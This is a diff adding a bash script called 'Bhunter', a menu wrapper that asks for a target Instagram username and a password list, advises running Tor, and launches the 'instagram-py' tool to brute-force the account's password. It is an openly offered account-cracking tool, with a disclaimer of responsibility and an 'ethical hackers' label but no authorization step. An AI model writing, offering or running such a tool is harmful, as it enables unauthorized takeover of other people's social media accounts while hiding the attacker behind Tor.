@@ -1,0 +1,59 @@
+#!/bin/bash
+yellow='\033[1;31m'
+blue='\033[1;34m'
+yellow='\033[1;37m'
+green='\033[1;32m'
+printf "$green"
+echo "Welcome User"
+echo  ""
+echo "We are not Responsible for Any Kind Of Damage From This Tool"
+echo ""
+echo "Author : Bhart Sharma"
+echo ""
+echo "Coded By : Bhart Sharma"
+echo ""
+echo "Instagram : bhartsharma00.2"
+echo ""
+echo "Project Manager : Dead_sec ( Python ) (V=1.3.3)"
+echo ""
+printf "$green"
+figlet -f big Bhunter
+printf "$blue"
+echo "[1] Attack Insta"
+echo "[2] About Developer"
+echo "[3] Exit"
+echo " "
+echo "[Select]"
+read -p ">|" o
+if [ $o = "1" ]
+then 
+clear
+figlet -f big Attack
+echo " "
+echo "Make Sure Tor is Runing"
+echo " "
+echo "Enter Target Name ="
+read -p ">|" t1
+echo "Enter Path Of Password List ="
+read -p ">|" p1
+clear
+cowsay Attack started Bhunter
+echo ""
+instagram-py $t1 $p1
+
+elif [ $o = "2" ]
+then
+clear
+figlet -f big About US
+echo " "
+echo "Bhunter Tool is Designed For Pentesters And Ethical Hackers . Bhunter helps You To Bruteforce Attack On Instagram ! 
+It Is Python-Project By (Death_sec) USERINTERFACE (Bhart Sharma) Instagram : bhartsharma00.2"
+
+elif [ $o = "3" ]
+then
+clear
+figlet -f big Kill
+echo ""
+echo "Thanks For Using Bhunter"
+exit
+fi
